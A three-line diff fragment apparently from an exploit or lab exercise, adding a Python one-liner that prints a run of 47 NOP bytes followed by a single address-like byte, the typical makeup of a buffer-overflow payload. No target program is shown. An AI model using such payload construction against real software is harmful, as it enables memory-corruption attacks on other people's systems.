@@ -1,0 +1,3 @@
+
+
+`python -c 'print "\x90"*47 + "\xbf"'`
